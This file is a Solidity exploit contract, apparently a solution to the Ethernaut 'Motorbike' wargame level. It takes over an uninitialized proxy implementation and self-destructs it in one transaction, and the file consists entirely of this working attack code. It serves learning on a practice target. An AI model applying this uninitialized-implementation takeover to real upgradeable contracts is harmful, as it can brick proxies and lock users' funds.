// SPDX-License-Identifier: MIT
pragma solidity <0.8.0;

/**
 * @title MotorbikeOneShot
 * @dev One-shot exploit that creates and destroys Engine in SAME transaction
 * EIP-6780 compliant!
 */

interface IEthernaut {
    function createLevelInstance(address _level) external payable returns (address);
}

interface IEngine {
    function initialize() external;
    function upgrader() external view returns (address);
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
}

contract Destroyer {
    function kill() external {
        selfdestruct(payable(address(0)));
    }
}

contract MotorbikeOneShot {
    bytes32 constant IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    
    event InstanceCreated(address instance);
    event EngineDestroyed(address engine);
    
    /**
     * @dev Exploit with engine address provided
     * Since we can't easily read another contract's storage in Solidity <0.8,
     * we'll get the engine address from transaction logs or external call
     */
    function exploit(
        address ethernautAddress, 
        address levelAddress,
        address engineAddress
    ) external payable returns (address instance) {
        // 1. Create instance through Ethernaut (creates Engine + Proxy)
        IEthernaut ethernaut = IEthernaut(ethernautAddress);
        instance = ethernaut.createLevelInstance{value: msg.value}(levelAddress);
        emit InstanceCreated(instance);
        
        // 2. Initialize Engine to become upgrader
        IEngine(engineAddress).initialize();
        
        // 3. Deploy Destroyer
        Destroyer destroyer = new Destroyer();
        
        // 4. Destroy Engine via upgradeToAndCall
        bytes memory data = abi.encodeWithSignature("kill()");
        IEngine(engineAddress).upgradeToAndCall(address(destroyer), data);
        
        emit EngineDestroyed(engineAddress);
        
        // ✅ Engine created and destroyed in SAME transaction!
        return instance;
    }
    
    receive() external payable {}
}
